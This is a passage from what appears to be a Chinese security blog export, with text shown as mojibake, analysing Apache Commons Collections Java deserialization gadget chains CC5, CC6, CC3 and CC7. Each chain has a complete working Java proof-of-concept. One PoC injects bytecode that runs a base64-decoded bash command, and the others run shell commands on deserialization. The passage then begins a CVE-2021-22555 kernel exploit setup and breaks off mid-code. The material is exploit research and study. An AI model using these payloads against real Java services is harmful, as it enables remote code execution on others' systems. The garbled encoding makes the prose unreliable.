ä¸ºå¦‚æœåœ¨åºåˆ—åŒ–æ—¶è¿›è¡Œæœ¬åœ°`RCE`ï¼Œ`val`å°±ä¼šç”±äºé“¾å­å˜æˆ`Runtime`ç±»ï¼Œç”±äº`Runtime`æ²¡åŠæ³•ç›´æ¥åºåˆ—åŒ–ï¼Œæ‰€ä»¥å…¶`val`å°±ä¼šå˜æˆå¦‚ä¸‹æ‰§è¡Œå‘½ä»¤ç»“æœçš„å­—ç¬¦ä¸²ï¼Œä»è€Œåœ¨ååºåˆ—æ—¶æ²¡åŠæ³•è°ƒç”¨åˆ°`TiedMapEntry.toString()`\n\n![image-20220801151900635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151900635.png)\n\nå¯¹æ¯”åŸ`POC`å¦‚ä¸‹ï¼Œå…¶`val`åœ¨åºåˆ—åŒ–æ—¶è¿˜æ˜¯ä¸€ä¸ª`TiedMapEntry`å¯¹è±¡\n\n![image-20220801152047107](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801152047107.png)\n\n## æ— æ•°ç»„\n\nè‡³äºæ— æ•°ç»„ç‰ˆæœ¬çš„ï¼Œå³å¦‚ä¸‹æ‰€ç¤º\n\n![image-20220802155244072](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802155244072.png)\n\nåšç‚¹å°æ”¹åŠ¨ï¼Œåœ¨`TiedMapEntry`ä¸­ä¼ å…¥`TemplatesImpl`å³å¯ï¼Œç¡®ä¿åœ¨`LazyMap.get()`çš„æ—¶å€™ï¼Œä¼ å…¥çš„`key`ä¸º`TemplatesImpl`ï¼Œä»è€Œè¿›è¡Œè°ƒç”¨åˆ°å¯¹åº”çš„`TemplatesImpl.newTransformer()`ã€‚\n\n![image-20220802154737033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802154737033.png)\n\nç›¸å…³`POC`å¦‚ä¸‹\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.CannotCompileException;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.NotFoundException;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport test.test;\n\nimport javax.management.BadAttributeValueExpException;\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.reflect.Array;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CC5T {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, IOException {\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.get(test.class.getName());//æ–°å»ºä¸€ä¸ªtestç±»ï¼Œæ²¡å•¥ç”¨\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"bash -c {echo,Li90ZXN0LnNo}|{base64,-d}|{bash,-i}\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] bytes = ctClass.toBytecode();\n        TemplatesImpl tempIm = new TemplatesImpl();\n        setField(tempIm, \"_name\", \"asd\");\n        setField(tempIm, \"_bytecodes\", new byte[][]{bytes});\n        setField(tempIm, \"_tfactory\", new TransformerFactoryImpl());\n        InvokerTransformer invTransf = new InvokerTransformer(\"newTransformer\", null, null);\n\n        HashMap innermap = new HashMap();\n\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);\n        //è°ƒç”¨Getæ–¹æ³•\n        TiedMapEntry tiedmap = new TiedMapEntry(map,tempIm);\n        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);\n        //BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);\n        setField(poc,\"val\",tiedmap);\n\n\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc5\"));\n            outputStream.writeObject(poc);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc5\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n\n\n# å…­ã€CC6\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220801171443518](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171443518.png)\n\nç»†èŠ‚å¦‚ä¸‹\n\n```\nHashSet.readObject()\nHashMap.put()->hash()\nTiedMapEntry.hashCode()->this.getValue()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼šæš‚æ— é™åˆ¶\n\n## Poc\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class CC6 {\n\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, new Object[]{\"./test.sh\"})});\n\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n\n        TiedMapEntry tiedmap = new TiedMapEntry(map,123);\n\n        HashSet hashset = new HashSet(1);\n        hashset.add(\"foo\");\n\n        Field field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\");\n        field.setAccessible(true);\n        HashMap hashset_map = (HashMap) field.get(hashset);\n\n        Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\");\n        table.setAccessible(true);\n        Object[] array = (Object[])table.get(hashset_map);\n\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n\n        Field key = node.getClass().getDeclaredField(\"key\");\n        key.setAccessible(true);\n        key.set(node,tiedmap);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc6\"));\n            outputStream.writeObject(hashset);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc6\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n## è§£æ\n\n### `HashSet.readObject()`\n\n![image-20220801171648405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171648405.png)\n\nè¿™ä¸ª`map`å³è®¾ç½®ä¸º`HashMap`\n\n### `HashMap.put()`\n\n![image-20220801171743740](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171743740.png)\n\nè¿™ä¸ª`key`åç»­è®¾ç½®ä¸º`TiedMapEntry`\n\n![image-20220801171856068](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171856068.png)\n\n### `TiedMapEntry.hashCode()`\n\n![image-20220801171928099](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171928099.png)\n\n![image-20220801171953683](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171953683.png)\n\nè¿™é‡Œçš„`map`å³è®¾ç½®ä¸º`Lazymap`\n\n### `LazyMap.get()`\n\nè¿˜æ˜¯ç»å…¸çš„é“¾å­`CIR`\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n\n\n## ğŸ”ºæ³¨\n\n### 1.`Hashset`è®¾ç½®\n\n```java\nHashSet hashset = new HashSet(1);\n\n//æ·»åŠ è‡³å°‘ä¸€ä¸ªå…ƒç´ ï¼Œæ–¹ä¾¿åç»­è·å–\nhashset.add(\"aaa\");\n\nField field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\");\nfield.setAccessible(true);\nHashMap hashset_map = (HashMap) field.get(hashset);\n```\n\nè·å–`HashSet`çš„`map`æˆå‘˜ä¸º`hashset_map`\n\n### 2.`HashMap`è®¾ç½®\n\n```java\n//è·å–HashMapä¸­çš„table,ç”¨æ¥è·å–HashMapä¸­ä¿å­˜çš„å…ƒç´ \n//transient Node<K,V>[] table;\nField table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\");\ntable.setAccessible(true);\n\n//è·å–arrayä¸ºHashSetçš„æˆå‘˜mapä¸­ä¿å­˜çš„å…ƒç´ æ•°ç»„\nObject[] array = (Object[])table.get(hashset_map);\n//è·å–nodeä¸ºä¿å­˜åœ¨hashsetä¸­çš„å…ƒç´ ,å…¶ç±»ä¸ºä¸€ä¸ªhashmap\nObject node = array[0];\nif(node == null){\n    node = array[1];\n}\n\n//è®¾ç½®hashsetä¸­çš„ä¸€ä¸ªå…ƒç´ hashmapçš„keyä¸ºTiedMapEntry\nField key = node.getClass().getDeclaredField(\"key\");\nkey.setAccessible(true);\nkey.set(node,tiedmap);\n```\n\n### 3.`writeObject`å’Œ`readObject`çš„å…³ç³»\n\nåœ¨`HashSet`çš„`readObject`ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ`//..`ä¸ºçœç•¥çš„ä»£ç éƒ¨åˆ†\n\n```java\nprivate void readObject(java.io.ObjectInputStream s)\n    throws java.io.IOException, ClassNotFoundException {\n    s.defaultReadObject();\n\n    int capacity = s.readInt();\n\t//.....\n    float loadFactor = s.readFloat();\n\t//.....\n    int size = s.readInt();\n\t//.......\n    for (int i=0; i<size; i++) {\n        @SuppressWarnings(\"unchecked\")\n        E e = (E) s.readObject();\n        map.put(e, PRESENT);\n    }\n}\n```\n\næŒ‰ç†è¯´ï¼Œè°ƒç”¨`map.put`ï¼Œå…¶å‡½æ•°å¦‚ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶`e`(å³ä¸‹é¢çš„`key`)ä¸º`TiedMapEntry`æ‰èƒ½è°ƒç”¨åˆ°`TiedMapEntry.hashCode`\n\n```java\npublic V put(K key, V value) {\n    return putVal(hash(key), key, value, false, true);\n}\n```\n\nä½†æ˜¯`E e = (E) s.readObject();`ï¼Œä¹Ÿå°±æ˜¯å¾—çœ‹å¯¹åº”çš„`HashSet.writeObject`ä¸­å°†ä»€ä¹ˆåºåˆ—åŒ–äº†\n\n```java\nprivate void writeObject(java.io.ObjectOutputStream s)\n    throws java.io.IOException {\n    // Write out any hidden serialization magic\n    s.defaultWriteObject();\n\n    // Write out HashMap capacity and load factor\n    s.writeInt(map.capacity());\n    s.writeFloat(map.loadFactor());\n    s.writeInt(map.size());\n\n    // Write out all elements in the proper order.\n    for (E e : map.keySet())\n        s.writeObject(e);\n}\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œå¯¹åº”çš„å†™å…¥`map`æˆå‘˜çš„`capacity`ã€`loadFactor`ã€`size`ä»¥åŠå…¶ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼ŒåŒæ—¶åœ¨`readObject`ä¹Ÿæ˜¯ä¾ç…§é¡ºåºä¸€ä¸€å¯¹åº”è¿›è¡Œè¯»å–ï¼Œå¦‚ä¸‹æ‰€ç¤º\n\n![image-20220801175923980](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801175923980.png)\n\næ‰€ä»¥åœ¨`writeObject`çš„æ—¶å€™ï¼Œåœ¨`HashSet`ä¸­çš„`map`æˆå‘˜çš„å…ƒç´ å¯æ§ï¼Œé‚£ä¹ˆåœ¨`readObject`çš„æ—¶å€™ï¼Œå¯¹åº”çš„å…ƒç´ ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå¯ä»¥è®¾ç½®ä¸º`TiedMapEntry`ã€‚\n\næ‰€ä»¥åœ¨`JAVA`ä¸­çš„`writeObject`å’Œ`readObject`æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå†™å…¥ä»€ä¹ˆæ ¼å¼æ•°æ®ï¼Œå°±ä¼šä¾ç…§ä»€ä¹ˆæ ¼å¼æ•°æ®è¯»å–ã€‚\n\n\n\n## CC3çš„HashMapç‰ˆæœ¬\n\nè¿™è¾¹é¡ºå¸¦æä¸€ä¸‹ä»¥ä¸‹è¿™ä¸¤æ¡é“¾å­ï¼Œå…¶å®éƒ½å·®ä¸å¤šï¼Œå¤§åŒå°å¼‚ï¼Œä¸»è¦æ˜¯å‰é¢çš„ä¸å¤ªä¸€æ ·ï¼Œç›´æ¥å€Ÿç”¨`HashMap`æ¥è¿›è¡Œè§¦å‘ã€‚\n\n![image-20220806174412815](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806174412815.png)\n\n### POC\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\n\npublic class CC3_O {\n\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[] {\n                String.class, Class[].class }, new Object[] {\n                \"getRuntime\", new Class[0] }),\n            new InvokerTransformer(\"invoke\", new Class[] {\n                Object.class, Object[].class }, new Object[] {\n                null, new Object[0] }),\n            new InvokerTransformer(\"exec\",\n                                   new Class[] { String.class }, new Object[]{\"touch ddd\"})});\n\n        HashMap hashmap = new HashMap();\n        hashmap.put(\"aaa\",\"bbb\");\n        hashmap.put(\"ccc\",\"ddd\");\n        LazyMap map = (LazyMap)LazyMap.decorate(hashmap,chain);\n        TiedMapEntry tiedmap = new TiedMapEntry(map,123);\n\n        Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\");\n        table.setAccessible(true);\n        Object[] array = (Object[])table.get(hashmap);\n\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        setField(node,\"key\",tiedmap);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3_o\"));\n            outputStream.writeObject(hashmap);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3_o\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\nä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œå¾€`HashMap`ä¸­æ”¾ä¸¤ä¸ªå…ƒç´ ï¼Œä½¿å…¶`table`ä¸ä¸ºç©ºï¼Œæ–¹ä¾¿å–å‡º`node`æ¥è®¾ç½®`TiedMapEntry`å³å¯ã€‚\n\nå…¶ä»–çš„å°±ç›¸å½“äºå»æ‰äº†`HashSet`çš„`CC6`äº†ï¼Œè§¦å‘ç‚¹åœ¨`HashMap.readObject()`ä¸‹çš„è®¡ç®—`hash`çš„åœ°æ–¹\n\n![image-20220806175025930](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806175025930.png)\n\n# ä¸ƒã€CC7\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220802153315688](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802153315688.png)\n\nç»†èŠ‚å¦‚ä¸‹ï¼š\n\n```\nHashtable.readObject()->reconstitutionPut()\nLazyMap.equals()==AbstractMapDecorator.equals()\nAbstractMap.equals()\nLazyMap.get()\n```\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼šæš‚æ— é™åˆ¶\n\n## Poc\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.*;\n\npublic class CC7 {\n\n    public static void main(String[] args) throws Exception {\n        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",\n                        new Class[]{String.class, Class[].class},\n                        new Object[]{\"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class}, new Object[]{\"touch bbbb\"})\n        };\n\n        Map innerMap1 = new HashMap();\n        Map innerMap2 = new HashMap();\n\n        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\n        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\n\n        lazyMap1.put(\"zZ\", 1);\n        lazyMap2.put(\"yy\", 1);\n\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(lazyMap1, 1);\n        hashtable.put(lazyMap2, 2);\n\n        setField(transformerChain,\"iTransformers\",transformers);\n\n        lazyMap2.remove(\"zZ\");\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc7\"));\n            outputStream.writeObject(hashtable);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc7\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## è§£æ\n\n### `Hashtable.readObject()`\n\n![image-20220807102603926](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102603926.png)\n\n### `Hashtable.reconstitutionPut()`\n\n![image-20220807102732158](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102732158.png)\n\nç”±äº`LazyMap`ç»§æ‰¿äº†`AbstractMapDecorator`ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°å…¶`equals`å‡½æ•°\n\n### `LazyMap.equals()==AbstractMapDecorator.equals()`\n\n![image-20220807102940029](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102940029.png)\n\nè¿™é‡Œçš„`equals`æ¥ç€å¾€ä¸‹è·³è½¬å°±ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šç›´æ¥è·³åˆ°`AbstractMap.equals()`äº†\n\n### `AbstractMap.equals()`\n\n![image-20220807103216037](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103216037.png)\n\n### `LazyMap.get()`\n\næ¥ç€å°±æ˜¯ç»å…¸é“¾å­`CCI`äº†ã€‚\n\n![image-20220807103304810](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103304810.png)\n\n## ğŸ”ºæ³¨\n\n### 1.`hashtable.put`ä¸¤æ¬¡\n\nç”±äºéœ€è¦åœ¨`Hashtable.reconstitutionPut()`ä¸­è¿›å…¥è¯¥å¾ªç¯ï¼Œæ‰€ä»¥éœ€è¦`hashtable.put`ä¸¤æ¬¡ï¼Œ\n\n![image-20220807104841649](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807104841649.png)\n\n### 2.åå°„è®¾ç½®`CCI`é“¾å­\n\nå¦‚æœç›´æ¥è¿›è¡Œè®¾ç½®ï¼Œé‚£ä¹ˆåœ¨æœ¬åœ°`hashtable.put`çš„æ—¶å€™ä¹Ÿä¼šè§¦å‘`RCE`ï¼Œé‚£ä¹ˆåœ¨`hashtable.put`ä¹‹åå†è®¾ç½®`CCI`é“¾ï¼Œå°±ä¸ä¼šæœ¬åœ°è§¦å‘`RCE`äº†ï¼Œè¿™æ ·æ˜¯ä¸ºäº†é˜²æ­¢éé¢„æœŸçš„ä¸€äº›ä¸œè¥¿ï¼Œå°±åƒåœ¨ä¹‹å‰`CC5`ä¸­é¢„é˜²æœ¬åœ°`RCE`ä¸€æ ·ã€‚\n\n![image-20220807105255253](../../../../AppData/Roaming/Typora/typora-user-images/image-20220807105255253.png)\n\n### 3.hashç¢°æ’\n\nä¸ºä»€ä¹ˆ`put`çš„æ—¶å€™éœ€è¦`yy`å’Œ`zZ`ï¼Œè¿™æ ·æ˜¯ä¸ºäº†ä½¿å¾—å…¶ç”Ÿæˆçš„`hash`ç›¸åŒï¼Œä»è€Œèƒ½å¤Ÿè¿›è¡Œæ¯”è¾ƒï¼Œåœ¨`Hashtable.reconstitutionPut()`ä¸­èƒ½å¤Ÿé€šè¿‡å‰é¢çš„`hash`ç›¸ç­‰æ¡ä»¶\n\n![image-20220807114011896](../../../../AppData/Roaming/Typora/typora-user-images/image-20220807114011896.png)\n\nå½“ç„¶æ¢æˆå…¶ä»–çš„èƒ½å¤Ÿè¿›è¡Œ`hash`ç¢°æ’çš„ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n### 4.removeå¿…è¦æ€§\n\nè‡³äºä¸ºä»€ä¹ˆéœ€è¦`lazyMap2.remove(\"zZ\");`ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç¬¬ä¸€æ¬¡`hashtable.put`çš„æ—¶å€™ï¼Œç”±äº`hashtable.table`ä¸º`null`ï¼Œæ— æ³•è¿›å…¥å¾ªç¯åˆ°å¦‚ä¸‹çš„`equals`å‡½æ•°è§¦å‘`LazyMap.get()`ã€‚\n\n![image-20220807112631117](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112631117.png)\n\nä½†æ˜¯ç¬¬äºŒæ¬¡çš„æ—¶å€™å°±ä¼šè¿›å…¥æ¯”è¾ƒå‡½æ•°\n\n![image-20220807112907832](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112907832.png)\n\nä»è€Œè¿›å…¥åˆ°`LazyMap.get()`è°ƒç”¨ç©ºçš„`transform`å‡½æ•°æ•°ç»„ï¼Œè¿”å›ä¸€ä¸ª`key`\n\n![image-20220807113208463](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113208463.png)\n\nå¯¼è‡´æˆ‘ä»¬çš„`LazyMap2`ä¼šå¤šä¸€ä¸ª`key`\n\n![image-20220807113425973](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113425973.png)\n\nå¦‚æœä¿ç•™ä¸‹æ¥ï¼Œå°±æ— æ³•è¿›å…¥åˆ°åœ¨`AbstractMap.equals`å¯¹åº”è§¦å‘æ¼æ´çš„åœ°æ–¹ï¼Œåœ¨å¦‚ä¸‹åœ°æ–¹å°±ç›´æ¥æ²¡æ‰ï¼Œé‚£ä¹ˆå°±éœ€è¦å»æ‰`lazyMap2`ä¸‹ç”±äºç©ºçš„`Transform`æ•°ç»„è°ƒç”¨å¤šå‡ºæ¥çš„ä¸€ä¸ª`key`äº†ï¼Œéƒ½æ˜¯ä¸ºäº†è¿›è¡Œå„ç§ç»•è¿‡ã€‚\n\n![image-20220807113545609](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113545609.png)\n\n\n\n# æ€»ç»“\n\næ„Ÿè§‰å·®ä¸å¤šäº†ï¼Œæ²¡ä»€ä¹ˆå¤ªå¤šçš„åœ°æ–¹éœ€è¦æ…¢æ…¢å­¦ä¹ äº†ã€‚\n\næœ¬èœé¸¡è§‰å¾—`CC`é“¾çš„å­¦ä¹ ä¸»è¦å°±æ˜¯åˆ†ä¸¤éƒ¨åˆ†å§\n\nä¸€éƒ¨åˆ†æ˜¯åé¢çš„ç”¨æ¥è°ƒç”¨å‘½ä»¤çš„éƒ¨åˆ†ï¼Œæˆ‘è§‰å¾—å«**å‘½ä»¤é“¾**æ¯”è¾ƒåˆé€‚ï¼Œæ¯”å¦‚è¿™é‡Œå†™åˆ°çš„ç»å…¸é“¾å­`CCI`ï¼Œç»å…¸é“¾å­`ITN`ä¹‹ç±»çš„ï¼Œè¿™éƒ¨åˆ†éƒ½å¤§åŒå°å¼‚ï¼Œæš‚æ—¶å°±é‚£ä¸€äº›ã€‚\n\nå¦ä¸€éƒ¨åˆ†å°±æ˜¯ä»`readObject`è°ƒç”¨åˆ°**å‘½ä»¤é“¾**çš„éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†é€šå¸¸æ˜¯éœ€è¦éœ€è¦æ…¢æ…¢æŒ–æ˜çš„ï¼Œä¸»è¦çš„ç‚¹å°±æ˜¯æ‰¾èƒ½è°ƒç”¨åˆ°`transform`åœ°æ–¹ã€‚\n\n\n\n","tags":["JAVAååºåˆ—åŒ–"],"categories":["JAVA","ååºåˆ—åŒ–"]},{"title":"CVE-2021-22555","url":"/2022/04/15/CVE-2021-22555_Netfilterå †æº¢å‡ºææƒæ¼æ´/","content":"\n# ç¯å¢ƒæ­å»º\n\nå‚è€ƒæ–‡ç« ï¼š\n\n[CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/254027)\n\næˆ–è€…æˆ‘å†™çš„èœé¸¡é¡¹ç›®ï¼š\n\n[KernelAll](https://github.com/PIG-007/kernelAll.git)\n\n## ğŸ”ºæ³¨ï¼š\n\næ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘å†™çš„é¡¹ç›®é‡Œçš„CVEç¯å¢ƒä¸­ï¼Œå»æ‰äº†é…ç½®ï¼š`CONFIG_SECURITY=n`ï¼ŒåŸå› æ˜¯åœ¨`load_msg()`å‡½æ•°ä¸­ç”³è¯·`msg_msg`ç»“æ„ä½“æ—¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œä¼šè°ƒç”¨åˆ°`security_msg_msg_alloc()`å‡½æ•°ï¼Œç»™`msg_msg`ç»“æ„ä½“ä¸­çš„`security`æŒ‡é’ˆèµ‹å€¼ï¼Œå¯¼è‡´ä¸‹é¢æ¼æ´åˆ©ç”¨æ—¶è¯»å–ä¼ªé€ `msg_msg`ç»“æ„ä½“ç”±äºæ£€æµ‹`security`å¯¼è‡´å‡ºé”™ã€‚\n\n```c\n//v5.11.14 /ipc/msgutil.c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n    //....\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\treturn msg;\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\nè€Œå»æ‰äº†é…ç½®ï¼š`CONFIG_SECURITY=n`ï¼Œå¯ä»¥ä¸ç”¨`security`æŒ‡é’ˆï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºé”™äº†\n\n```c\n//v5.11.14 /include/linux/security.h\n#ifdef CONFIG_SECURITY\n//.....\nint security_msg_msg_alloc(struct msg_msg *msg);\nvoid security_msg_msg_free(struct msg_msg *msg);\nint security_msg_queue_alloc(struct kern_ipc_perm *msq);\nvoid security_msg_queue_free(struct kern_ipc_perm *msq);\nint security_msg_queue_associate(struct kern_ipc_perm *msq, int msqflg);\nint security_msg_queue_msgctl(struct kern_ipc_perm *msq, int cmd);\nint security_msg_queue_msgsnd(struct kern_ipc_perm *msq,\n\t\t\t      struct msg_msg *msg, int msqflg);\nint security_msg_queue_msgrcv(struct kern_ipc_perm *msq, struct msg_msg *msg,\n\t\t\t      struct task_struct *target, long type, int mode);\n//....\n#else /* CONFIG_SECURITY */\n//....\nstatic inline int security_msg_msg_alloc(struct msg_msg *msg){return 0;}\nstatic inline void security_msg_msg_free(struct msg_msg *msg){ }\n\nstatic inline int security_msg_queue_alloc(struct kern_ipc_perm *msq){return 0;}\n\nstatic inline void security_msg_queue_free(struct kern_ipc_perm *msq){ }\n\nstatic inline int security_msg_queue_associate(struct kern_ipc_perm *msq,\n\t\t\t\t\t       int msqflg){return 0;}\n\nstatic inline int security_msg_queue_msgctl(struct kern_ipc_perm *msq, int cmd){return 0;}\n\nstatic inline int security_msg_queue_msgsnd(struct kern_ipc_perm *msq,\n\t\t\t\t\t    